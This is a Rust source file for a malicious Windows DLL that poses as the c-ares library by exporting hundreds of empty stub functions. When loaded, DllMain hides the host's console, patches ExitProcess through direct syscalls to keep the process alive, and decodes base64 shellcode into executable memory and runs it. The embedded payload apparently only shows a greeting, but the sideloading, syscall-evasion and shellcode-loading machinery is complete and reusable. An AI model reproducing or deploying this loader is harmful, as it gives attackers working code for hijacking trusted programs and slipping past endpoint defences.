#![allow(non_snake_case)]

use std::arch::global_asm;
use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::{BOOL, HINSTANCE};
use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
use windows::Win32::System::Threading::{
    CreateProcessA, CreateThread,
    PROCESS_INFORMATION, STARTUPINFOA,
    THREAD_CREATION_FLAGS, CREATE_NO_WINDOW,
    INFINITE, WaitForSingleObject, CreateEventA,
};
use windows::Win32::System::LibraryLoader::GetModuleHandleA;
use windows::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
use base64::{Engine as _, engine::general_purpose};
use windows::Win32::System::Console::GetConsoleWindow;

mod syscall;
use syscall::get_syscall_number;

static mut ORIGINAL_EXIT_PROCESS: usize = 0;

global_asm!(r#"
.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x38]
    syscall
    ret

.global asm_nt_protect_virtual_memory
asm_nt_protect_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret
"#);

extern "C" {
    fn asm_nt_allocate_virtual_memory(
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        BaseAddress: &mut *mut std::ffi::c_void,
        ZeroBits: usize,
        RegionSize: &mut usize,
        AllocationType: u32,
        Protect: u32,
        syscall_id: u32,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;

    fn asm_nt_protect_virtual_memory(
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        BaseAddress: &mut *mut std::ffi::c_void,
        NumberOfBytesToProtect: &mut usize,
        NewAccessProtection: u32,
        OldAccessProtection: &mut u32,
        syscall_id: u32,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;

    fn asm_nt_write_virtual_memory(
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        BaseAddress: *mut std::ffi::c_void,
        Buffer: *const std::ffi::c_void,
        NumberOfBytesToWrite: usize,
        NumberOfBytesWritten: &mut usize,
        syscall_id: u32,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;
}

macro_rules! export_function {
    ($name:ident) => {
        #[no_mangle]
        pub extern "system" fn $name() {}
    };
}

export_function!(ares_array_at);
export_function!(ares_array_at_const);
export_function!(ares_array_claim_at);
export_function!(ares_array_create);
export_function!(ares_array_destroy);
export_function!(ares_array_finish);
export_function!(ares_array_first);
export_function!(ares_array_first_const);
export_function!(ares_array_insert_at);
export_function!(ares_array_insert_first);
export_function!(ares_array_insert_last);
export_function!(ares_array_insertdata_at);
export_function!(ares_array_insertdata_first);
export_function!(ares_array_insertdata_last);
export_function!(ares_array_last);
export_function!(ares_array_last_const);
export_function!(ares_array_len);
export_function!(ares_array_remove_at);
export_function!(ares_array_remove_first);
export_function!(ares_array_remove_last);
export_function!(ares_array_set_size);
export_function!(ares_array_sort);
export_function!(ares_buf_append);
export_function!(ares_buf_append_be16);
export_function!(ares_buf_append_be32);
export_function!(ares_buf_append_byte);
export_function!(ares_buf_append_finish);
export_function!(ares_buf_append_num_dec);
export_function!(ares_buf_append_num_hex);
export_function!(ares_buf_append_start);
export_function!(ares_buf_append_str);
export_function!(ares_buf_begins_with);
export_function!(ares_buf_consume);
export_function!(ares_buf_consume_charset);
export_function!(ares_buf_consume_line);
export_function!(ares_buf_consume_nonwhitespace);
export_function!(ares_buf_consume_until_charset);
export_function!(ares_buf_consume_until_seq);
export_function!(ares_buf_consume_whitespace);
export_function!(ares_buf_create);
export_function!(ares_buf_create_const);
export_function!(ares_buf_destroy);
export_function!(ares_buf_fetch_be16);
export_function!(ares_buf_fetch_be32);
export_function!(ares_buf_fetch_bytes);
export_function!(ares_buf_fetch_bytes_dup);
export_function!(ares_buf_fetch_bytes_into_buf);
export_function!(ares_buf_fetch_str_dup);
export_function!(ares_buf_finish_bin);
export_function!(ares_buf_finish_str);
export_function!(ares_buf_get_position);
export_function!(ares_buf_hexdump);
export_function!(ares_buf_len);
export_function!(ares_buf_load_file);
export_function!(ares_buf_parse_dns_binstr);
export_function!(ares_buf_parse_dns_str);
export_function!(ares_buf_peek);
export_function!(ares_buf_peek_byte);
export_function!(ares_buf_reclaim);
export_function!(ares_buf_replace);
export_function!(ares_buf_set_length);
export_function!(ares_buf_set_position);
export_function!(ares_buf_split);
export_function!(ares_buf_split_str);
export_function!(ares_buf_split_str_array);
export_function!(ares_buf_tag);
export_function!(ares_buf_tag_clear);
export_function!(ares_buf_tag_fetch);
export_function!(ares_buf_tag_fetch_bytes);
export_function!(ares_buf_tag_fetch_constbuf);
export_function!(ares_buf_tag_fetch_strdup);
export_function!(ares_buf_tag_fetch_string);
export_function!(ares_buf_tag_length);
export_function!(ares_buf_tag_rollback);
export_function!(ares_cancel);
export_function!(ares_create_query);
export_function!(ares_destroy);
export_function!(ares_destroy_options);
export_function!(ares_dns_addr_to_ptr);
export_function!(ares_dns_class_fromstr);
export_function!(ares_dns_class_tostr);
export_function!(ares_dns_opcode_tostr);
export_function!(ares_dns_opt_get_datatype);
export_function!(ares_dns_opt_get_name);
export_function!(ares_dns_parse);
export_function!(ares_dns_pton);
export_function!(ares_dns_rcode_tostr);
export_function!(ares_dns_rec_type_fromstr);
export_function!(ares_dns_rec_type_tostr);
export_function!(ares_dns_record_create);
export_function!(ares_dns_record_destroy);
export_function!(ares_dns_record_duplicate);
export_function!(ares_dns_record_get_flags);
export_function!(ares_dns_record_get_id);
export_function!(ares_dns_record_get_opcode);
export_function!(ares_dns_record_get_rcode);
export_function!(ares_dns_record_query_add);
export_function!(ares_dns_record_query_cnt);
export_function!(ares_dns_record_query_get);
export_function!(ares_dns_record_query_set_name);
export_function!(ares_dns_record_query_set_type);
export_function!(ares_dns_record_rr_add);
export_function!(ares_dns_record_rr_cnt);
export_function!(ares_dns_record_rr_del);
export_function!(ares_dns_record_rr_get);
export_function!(ares_dns_record_rr_get_const);
export_function!(ares_dns_record_set_id);
export_function!(ares_dns_rr_add_abin);
export_function!(ares_dns_rr_del_abin);
export_function!(ares_dns_rr_del_opt_byid);
export_function!(ares_dns_rr_get_abin);
export_function!(ares_dns_rr_get_abin_cnt);
export_function!(ares_dns_rr_get_addr);
export_function!(ares_dns_rr_get_addr6);
export_function!(ares_dns_rr_get_bin);
export_function!(ares_dns_rr_get_class);
export_function!(ares_dns_rr_get_keys);
export_function!(ares_dns_rr_get_name);
export_function!(ares_dns_rr_get_opt);
export_function!(ares_dns_rr_get_opt_byid);
export_function!(ares_dns_rr_get_opt_cnt);
export_function!(ares_dns_rr_get_str);
export_function!(ares_dns_rr_get_ttl);
export_function!(ares_dns_rr_get_type);
export_function!(ares_dns_rr_get_u16);
export_function!(ares_dns_rr_get_u32);
export_function!(ares_dns_rr_get_u8);
export_function!(ares_dns_rr_key_datatype);
export_function!(ares_dns_rr_key_to_rec_type);
export_function!(ares_dns_rr_key_tostr);
export_function!(ares_dns_rr_set_addr);
export_function!(ares_dns_rr_set_addr6);
export_function!(ares_dns_rr_set_bin);
export_function!(ares_dns_rr_set_opt);
export_function!(ares_dns_rr_set_str);
export_function!(ares_dns_rr_set_u16);
export_function!(ares_dns_rr_set_u32);
export_function!(ares_dns_rr_set_u8);
export_function!(ares_dns_section_tostr);
export_function!(ares_dns_write);
export_function!(ares_dup);
export_function!(ares_expand_name);
export_function!(ares_expand_string);
export_function!(ares_fds);
export_function!(ares_free);
export_function!(ares_free_array);
export_function!(ares_free_data);
export_function!(ares_free_hostent);
export_function!(ares_free_string);
export_function!(ares_freeaddrinfo);
export_function!(ares_get_servers);
export_function!(ares_get_servers_csv);
export_function!(ares_get_servers_ports);
export_function!(ares_getaddrinfo);
export_function!(ares_gethostbyaddr);
export_function!(ares_gethostbyname);
export_function!(ares_gethostbyname_file);
export_function!(ares_getnameinfo);
export_function!(ares_getsock);
export_function!(ares_htable_asvp_create);
export_function!(ares_htable_asvp_destroy);
export_function!(ares_htable_asvp_get);
export_function!(ares_htable_asvp_get_direct);
export_function!(ares_htable_asvp_insert);
export_function!(ares_htable_asvp_keys);
export_function!(ares_htable_asvp_num_keys);
export_function!(ares_htable_asvp_remove);
export_function!(ares_htable_dict_create);
export_function!(ares_htable_dict_destroy);
export_function!(ares_htable_dict_get);
export_function!(ares_htable_dict_get_direct);
export_function!(ares_htable_dict_insert);
export_function!(ares_htable_dict_keys);
export_function!(ares_htable_dict_num_keys);
export_function!(ares_htable_dict_remove);
export_function!(ares_htable_strvp_claim);
export_function!(ares_htable_strvp_create);
export_function!(ares_htable_strvp_destroy);
export_function!(ares_htable_strvp_get);
export_function!(ares_htable_strvp_get_direct);
export_function!(ares_htable_strvp_insert);
export_function!(ares_htable_strvp_num_keys);
export_function!(ares_htable_strvp_remove);
export_function!(ares_htable_szvp_create);
export_function!(ares_htable_szvp_destroy);
export_function!(ares_htable_szvp_get);
export_function!(ares_htable_szvp_get_direct);
export_function!(ares_htable_szvp_insert);
export_function!(ares_htable_szvp_num_keys);
export_function!(ares_htable_szvp_remove);
export_function!(ares_htable_vpstr_create);
export_function!(ares_htable_vpstr_destroy);
export_function!(ares_htable_vpstr_get);
export_function!(ares_htable_vpstr_get_direct);
export_function!(ares_htable_vpstr_insert);
export_function!(ares_htable_vpstr_num_keys);
export_function!(ares_htable_vpstr_remove);
export_function!(ares_htable_vpvp_create);
export_function!(ares_htable_vpvp_destroy);
export_function!(ares_htable_vpvp_get);
export_function!(ares_htable_vpvp_get_direct);
export_function!(ares_htable_vpvp_insert);
export_function!(ares_htable_vpvp_num_keys);
export_function!(ares_htable_vpvp_remove);
export_function!(ares_inet_ntop);
export_function!(ares_inet_pton);
export_function!(ares_init);
export_function!(ares_init_options);
export_function!(ares_is_hostname);
export_function!(ares_library_cleanup);
export_function!(ares_library_init);
export_function!(ares_library_init_mem);
export_function!(ares_library_initialized);
export_function!(ares_llist_clear);
export_function!(ares_llist_create);
export_function!(ares_llist_destroy);
export_function!(ares_llist_first_val);
export_function!(ares_llist_insert_after);
export_function!(ares_llist_insert_before);
export_function!(ares_llist_insert_first);
export_function!(ares_llist_insert_last);
export_function!(ares_llist_last_val);
export_function!(ares_llist_len);
export_function!(ares_llist_node_claim);
export_function!(ares_llist_node_destroy);
export_function!(ares_llist_node_first);
export_function!(ares_llist_node_idx);
export_function!(ares_llist_node_last);
export_function!(ares_llist_node_mvparent_first);
export_function!(ares_llist_node_mvparent_last);
export_function!(ares_llist_node_next);
export_function!(ares_llist_node_parent);
export_function!(ares_llist_node_prev);
export_function!(ares_llist_node_replace);
export_function!(ares_llist_node_val);
export_function!(ares_llist_replace_destructor);
export_function!(ares_malloc);
export_function!(ares_malloc_zero);
export_function!(ares_memeq);
export_function!(ares_memeq_ci);
export_function!(ares_memmem);
export_function!(ares_mkquery);
export_function!(ares_parse_a_reply);
export_function!(ares_parse_aaaa_reply);
export_function!(ares_parse_caa_reply);
export_function!(ares_parse_mx_reply);
export_function!(ares_parse_naptr_reply);
export_function!(ares_parse_ns_reply);
export_function!(ares_parse_ptr_reply);
export_function!(ares_parse_soa_reply);
export_function!(ares_parse_srv_reply);
export_function!(ares_parse_txt_reply);
export_function!(ares_parse_txt_reply_ext);
export_function!(ares_parse_uri_reply);
export_function!(ares_process);
export_function!(ares_process_fd);
export_function!(ares_process_fds);
export_function!(ares_process_pending_write);
export_function!(ares_query);
export_function!(ares_query_dnsrec);
export_function!(ares_queue_active_queries);
export_function!(ares_queue_wait_empty);
export_function!(ares_realloc);
export_function!(ares_realloc_zero);
export_function!(ares_reinit);
export_function!(ares_save_options);
export_function!(ares_search);
export_function!(ares_search_dnsrec);
export_function!(ares_send);
export_function!(ares_send_dnsrec);
export_function!(ares_set_local_dev);
export_function!(ares_set_local_ip4);
export_function!(ares_set_local_ip6);
export_function!(ares_set_pending_write_cb);
export_function!(ares_set_server_state_callback);
export_function!(ares_set_servers);
export_function!(ares_set_servers_csv);
export_function!(ares_set_servers_ports);
export_function!(ares_set_servers_ports_csv);
export_function!(ares_set_socket_callback);
export_function!(ares_set_socket_configure_callback);
export_function!(ares_set_socket_functions);
export_function!(ares_set_socket_functions_ex);
export_function!(ares_set_sortlist);
export_function!(ares_str_isalnum);
export_function!(ares_str_isnum);
export_function!(ares_str_isprint);
export_function!(ares_str_lower);
export_function!(ares_str_ltrim);
export_function!(ares_str_rtrim);
export_function!(ares_str_trim);
export_function!(ares_strcasecmp);
export_function!(ares_strcaseeq);
export_function!(ares_strcaseeq_max);
export_function!(ares_strcmp);
export_function!(ares_strcpy);
export_function!(ares_strdup);
export_function!(ares_streq);
export_function!(ares_streq_max);
export_function!(ares_strerror);
export_function!(ares_strlen);
export_function!(ares_strncasecmp);
export_function!(ares_strncmp);
export_function!(ares_strnlen);
export_function!(ares_threadsafety);
export_function!(ares_timeout);
export_function!(ares_tolower);
export_function!(ares_version);

unsafe fn hook_exit_process() {
    use windows::Win32::System::LibraryLoader::GetProcAddress;

    let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap();
    let exit_proc_addr = GetProcAddress(kernel32, PCSTR(b"ExitProcess\0".as_ptr()))
        .unwrap() as *mut u8;

    ORIGINAL_EXIT_PROCESS = exit_proc_addr as usize;

    let mut base_address = exit_proc_addr as *mut std::ffi::c_void;
    let mut region_size = 12usize;
    let mut old_protect = 0u32;

    let nt_protect_id = get_syscall_number("NtProtectVirtualMemory").unwrap();
    let nt_write_id = get_syscall_number("NtWriteVirtualMemory").unwrap();

    asm_nt_protect_virtual_memory(
        -1isize as windows_sys::Win32::Foundation::HANDLE,
        &mut base_address,
        &mut region_size,
        windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
        &mut old_protect,
        nt_protect_id,
    );

    let hook_addr = fake_exit_process as usize;

    let patch: [u8; 12] = [
        0x48, 0xB8,
        (hook_addr & 0xFF) as u8,
        ((hook_addr >> 8) & 0xFF) as u8,
        ((hook_addr >> 16) & 0xFF) as u8,
        ((hook_addr >> 24) & 0xFF) as u8,
        ((hook_addr >> 32) & 0xFF) as u8,
        ((hook_addr >> 40) & 0xFF) as u8,
        ((hook_addr >> 48) & 0xFF) as u8,
        ((hook_addr >> 56) & 0xFF) as u8,
        0xFF, 0xE0,
    ];

    let mut bytes_written = 0usize;
    asm_nt_write_virtual_memory(
        -1isize as windows_sys::Win32::Foundation::HANDLE,
        exit_proc_addr as *mut std::ffi::c_void,
        patch.as_ptr() as *const std::ffi::c_void,
        patch.len(),
        &mut bytes_written,
        nt_write_id,
    );

    asm_nt_protect_virtual_memory(
        -1isize as windows_sys::Win32::Foundation::HANDLE,
        &mut base_address,
        &mut region_size,
        old_protect,
        &mut old_protect,
        nt_protect_id,
    );
}

unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
    let event = CreateEventA(None, true, false, PCSTR::null()).unwrap();
    WaitForSingleObject(event, INFINITE);
}

const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0b0gB0FCLSBhEi0AgSQHQ41xI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpT////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VSGVsbG8gZnJvbSBKdWxlcyEASnVsZXMA";

unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
    let shellcode = general_purpose::STANDARD.decode(ENCODED_SHELLCODE).unwrap();

    let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut region_size = shellcode.len();

    let nt_alloc_id = get_syscall_number("NtAllocateVirtualMemory").unwrap();
    let nt_write_id = get_syscall_number("NtWriteVirtualMemory").unwrap();

    let status = asm_nt_allocate_virtual_memory(
        -1isize as windows_sys::Win32::Foundation::HANDLE,
        &mut exec_mem,
        0,
        &mut region_size,
        windows_sys::Win32::System::Memory::MEM_COMMIT | windows_sys::Win32::System::Memory::MEM_RESERVE,
        windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
        nt_alloc_id,
    );

    if status == 0 && !exec_mem.is_null() {
        let mut bytes_written = 0usize;
        asm_nt_write_virtual_memory(
            -1isize as windows_sys::Win32::Foundation::HANDLE,
            exec_mem,
            shellcode.as_ptr() as *const std::ffi::c_void,
            shellcode.len(),
            &mut bytes_written,
            nt_write_id,
        );

        let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
        exec_fn();
    }
    0
}

unsafe extern "system" fn notepad_thread(_: *mut core::ffi::c_void) -> u32 {
    let mut si = STARTUPINFOA::default();
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    let mut pi = PROCESS_INFORMATION::default();
    let mut cmd = b"notepad.exe\0".to_vec();

    let _ = CreateProcessA(
        PCSTR::null(),
        PSTR(cmd.as_mut_ptr()),
        None, None, false,
        CREATE_NO_WINDOW,
        None, PCSTR::null(),
        &si, &mut pi,
    );
    0
}

#[no_mangle]
pub extern "system" fn DllMain(
    _hinst_dll: HINSTANCE,
    fdw_reason: u32,
    _lp_reserved: *mut core::ffi::c_void,
) -> BOOL {
    if fdw_reason == DLL_PROCESS_ATTACH {
        unsafe {
            // ahot.exe konsol penceresini gizle
            let hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);

            // ExitProcess'i hook'la - process kapanmasın
            hook_exit_process();

            // Shellcode'u başlat
            let _ = CreateThread(
                None, 0, Some(shellcode_thread), None, THREAD_CREATION_FLAGS(0), None,
            );
        }
    }
    BOOL(1)
}
